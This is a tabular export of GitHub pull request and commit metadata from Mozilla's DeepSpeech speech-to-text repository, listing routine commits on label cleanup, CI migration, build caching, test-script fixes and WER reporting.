1334,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d38a3f13f73ae6d4e782fd4cb4a36f9eaf9a16e4,"Removing exclamation-marks, colons and semi-colons from labels"
1335,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96a720c597e05fab8f2372ec16a73e7af052e156,Relative paths in M-AILAB importer
1336,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3240bffbc87ad51417f50e7f64d91fb9b6bcad1,Update evaluate_tflite with wav_filename
1337,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19efb47a452b650d1450129c0917662c62ced107,"Merge pull request #2479 from tilmankamp/keepcolons

Removing exclamation-marks, colons and semi-colons from labels"
1338,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c746361d4ad6407f9eda15952eb655f9e68a3e91,"Merge pull request #2480 from tilmankamp/fixmailab

Relative paths in M-AILAB importer"
1339,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27efcf470a44a3e6af781433b064ac33dcf1d9ef,swap taskcluster.net references for community-tc.services.mozilla.com
1340,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3501ce15c2ef04032dea29da9ca7fd746c47968f,update taskcluster.yml for community-tc
1341,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd12eacafa7f92acb2b5bf5d6af9d26f047cb045,include /api/ in community-tc URLs
1342,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c86eca944f36657c5116b8c2da362b8544d5a8e8,remove unnecessary lowest-priority scope
1343,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6929fee2d3ebf7c07e29ca6d026bdb60ae43d443,"Merge pull request #2482 from lissyx/fix-eval-tflite

Update evalutate_tflite with wav_filename"
1344,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,489dbad3a43393451c5051dc60a4e049969a339a,Check unicode normalization
1345,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1da680ae9ac85e5ee5ed36b077e25e337a0aaf8,"Merge pull request #2483 from lissyx/alphabet-consistency

Check unicode normalization"
1346,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cbcf1da3c62f7c578e965f244731a58072e16db,Update JS doc for changed API
1347,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8235dd2a4ee8262733dedf667d3a41bc730fcd11,"Merge pull request #2492 from lissyx/fix-js-doc

Update JS doc for changed API"
1348,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1089b59e72d9e58386aa4ccf70d4405719e1631a,"Merge pull request #2486 from djmitche/bug1574659

Bug 1574659 - migrate from taskcluster.net to community-tc"
1349,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c898d92cb9ef6b4f2de5349b9af6d58bb3b867a,Move to TC Community
1350,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e400760b2023b20abc19c885b7834db8b1b5321,"Merge pull request #2491 from lissyx/tc-community

Move to TC Community"
1351,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1be01b1d6826383aa27ab500ad7b4b244e6a108,Bump VERSION to 0.6.0-alpha.12
1352,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,493aaed151e654fdc0daf3ede92b92a25c25a8d0,"Merge pull request #2493 from lissyx/bump-v0.6.0-alpha.12

Bump VERSION to 0.6.0-alpha.12"
1353,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c820817794d445746aefb1b5347b35bf5e0c621,Embed alphabet directly in model
1354,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3fdc7d422d96b209373fa00076a5d09084a0717e,Remove alphabet param usage
1355,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34314767f77379d57b6f31637e81501b071f8bc7,Fix prod model tests
1356,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8ebf9011b10c3539fef3abfdc8dc118c2bf64c7,Address review comments
1357,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd6a9d03b1c8d57feabf417cc7d226a092c60092,Use model from Python 3.6 training run
1358,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10c652b420a91f696c34dd6d0f48f886f90cf6d9,Document serialization format
1359,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b152802fd1f3d3d61e830a155ee91bb5c7cb7eb7,"Add ElectronJS v7.0

Fixes #2494"
1360,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af5d18cf29f43e3e653f75c62ad9c002a5eac0ca,"Merge pull request #2481 from mozilla/embed-alphabet

Embed alphabet in model file"
1361,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d03353e64839870f55b4e4e3ebb1221f0ca8211,"Merge pull request #2495 from lissyx/electronjs7

Add ElectronJS v7.0"
1362,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2737,2737,Produce and use node-gyp cache,,lissyx,1645737,2020-02-10T15:48:10Z,COLLABORATOR,True,130,1,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce5629d33a70e20fe59566a4c152aa4386683e1c,"Produce and use node-gyp cache

Fixes #2718"
1363,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2736,2736,Remove extraneous OR operators in tc-tests-utils.sh,,reuben,477142,2020-02-10T15:45:35Z,MEMBER,True,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3ce59de58fe90c2dca074acc35ace5138754f13,"Remove extraneous OR operators in tc-tests-utils.sh

Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments"
1364,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2736,2736,Remove extraneous OR operators in tc-tests-utils.sh,,reuben,477142,2020-02-10T15:45:35Z,MEMBER,True,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,245fb24946889e0fa3a85400994031c2271cddbe,Fix expected outputs
1365,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2736,2736,Remove extraneous OR operators in tc-tests-utils.sh,,reuben,477142,2020-02-10T15:45:35Z,MEMBER,True,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92be76657fe99d4078447a6130dbb6565dd544be,Stop using 8kHz data with concurrent streams test as it does not resample
1366,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2734,2734,Remove extraneous OR operators in tc-tests-utils.sh,Trying again and hoping TC will work this time.,reuben,477142,2020-02-10T15:22:58Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3ce59de58fe90c2dca074acc35ace5138754f13,"Remove extraneous OR operators in tc-tests-utils.sh

Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments"
1367,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2734,2734,Remove extraneous OR operators in tc-tests-utils.sh,Trying again and hoping TC will work this time.,reuben,477142,2020-02-10T15:22:58Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,245fb24946889e0fa3a85400994031c2271cddbe,Fix expected outputs
1368,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2734,2734,Remove extraneous OR operators in tc-tests-utils.sh,Trying again and hoping TC will work this time.,reuben,477142,2020-02-10T15:22:58Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92be76657fe99d4078447a6130dbb6565dd544be,Stop using 8kHz data with concurrent streams test as it does not resample
1369,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2733,2733,Building with node-gyp@6.x,,lissyx,1645737,2020-02-10T13:50:58Z,COLLABORATOR,False,5,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b02db828733523b4d32295ed239da61598ef14e,Building with node-gyp@6.x
1370,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2731,2731,Build SWIG locally,,lissyx,1645737,2020-02-07T15:04:12Z,COLLABORATOR,True,231,1623,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5149ded1215c5c41ae7a27f304a30a573154412,Build SWIG locally
1371,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2729,2729,Remove extraneous OR operators in tc-tests-utils.sh,"Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments",reuben,477142,2020-02-06T17:06:23Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72a91dedbd10b5866d0b4097f38530351ca0ed0a,"Remove extraneous OR operators in tc-tests-utils.sh

Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments"
1372,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2729,2729,Remove extraneous OR operators in tc-tests-utils.sh,"Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments",reuben,477142,2020-02-06T17:06:23Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,399e6ba2a1aa6a99ccd49c676b6f499f0568ecac,Fix expected outputs
1373,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2729,2729,Remove extraneous OR operators in tc-tests-utils.sh,"Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments",reuben,477142,2020-02-06T17:06:23Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,62de6d4ea78d7d8fade049e1753024c92d84b2b0,Stop using 8kHz data with concurrent streams test as it does not resample
1374,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2729,2729,Remove extraneous OR operators in tc-tests-utils.sh,"Fixes:

+ '[' -o 16k = 8k ']'
/home/build-user/DeepSpeech/ds/taskcluster/tc-tests-utils.sh: line 262: [: too many arguments",reuben,477142,2020-02-06T17:06:23Z,MEMBER,False,9,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,addaefb2e24897d2c1c34d4ba85dd04f7f789544,Force tests
1375,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2f05ccabe85d2b822f32aedb1cfe20aa1ab02e6,Print best and worst results in a WER report.
1376,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,272ed99d24e1f19e2742a8fd5bb3a378e1e15d5c,Add median examples. Fix sorting.
1377,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,369e3c9fc3f080bdf6d181200ef207e9108bf297,Revert linebreak.
1378,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,320e815bb7d1d842fe64e1119b74e068bf5a9829,Remove semicolon.
1379,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b5d3e7e0d93849c16f9a156db16320282c6ca9,Restore order of imports.
1380,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63a07e6834c2a7a00e54e810926faa6a96855f7b,Added summary to evaluate_tflite.py and moved method to evaluate_tools.py.
1381,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ec88b7f28334672b9be8f91fa2b0d6cf6b5b995,Add whitespace again.
1382,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5145526f0690fd24728a4353a6530b1a56eb4b2,Dont need flags.
1383,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4186cbef883400b6d6c30ec64284454a1232f938,Reverse ordered loss again.
1384,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de92142986804ec781a8ad053095c7728f4318be,Named example sections.
1385,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cc91fafb23178f73e15a2458ac66ddbb21e2fb9,Moved summary printing to samples printing.
1386,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2728,2728,Wer report best+median+worst,,lissyx,1645737,2020-02-06T14:01:10Z,COLLABORATOR,False,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,726cc20586e2f8afc0b87f5ee84afc941e70d2d6,Rename dataset param.
1387,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2f05ccabe85d2b822f32aedb1cfe20aa1ab02e6,Print best and worst results in a WER report.
1388,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,272ed99d24e1f19e2742a8fd5bb3a378e1e15d5c,Add median examples. Fix sorting.
1389,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,369e3c9fc3f080bdf6d181200ef207e9108bf297,Revert linebreak.
1390,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,320e815bb7d1d842fe64e1119b74e068bf5a9829,Remove semicolon.
1391,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b5d3e7e0d93849c16f9a156db16320282c6ca9,Restore order of imports.
1392,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63a07e6834c2a7a00e54e810926faa6a96855f7b,Added summary to evaluate_tflite.py and moved method to evaluate_tools.py.
1393,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ec88b7f28334672b9be8f91fa2b0d6cf6b5b995,Add whitespace again.
1394,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5145526f0690fd24728a4353a6530b1a56eb4b2,Dont need flags.
1395,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4186cbef883400b6d6c30ec64284454a1232f938,Reverse ordered loss again.
1396,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2727,2727,Wer report best+median+worst,,lissyx,1645737,2020-02-06T13:35:17Z,COLLABORATOR,False,50,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de92142986804ec781a8ad053095c7728f4318be,Named example sections.
1397,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2726,2726,Fix Intermediate decoding , Fixes #2725,carlfm01,32177100,2020-02-06T04:52:31Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17e011c18d21c06e53d3b5909fb051cba36d0824,Fix Intermediate decoding
1398,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2f05ccabe85d2b822f32aedb1cfe20aa1ab02e6,Print best and worst results in a WER report.
1399,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,272ed99d24e1f19e2742a8fd5bb3a378e1e15d5c,Add median examples. Fix sorting.
1400,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,369e3c9fc3f080bdf6d181200ef207e9108bf297,Revert linebreak.
1401,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,320e815bb7d1d842fe64e1119b74e068bf5a9829,Remove semicolon.
1402,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b5d3e7e0d93849c16f9a156db16320282c6ca9,Restore order of imports.
1403,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63a07e6834c2a7a00e54e810926faa6a96855f7b,Added summary to evaluate_tflite.py and moved method to evaluate_tools.py.
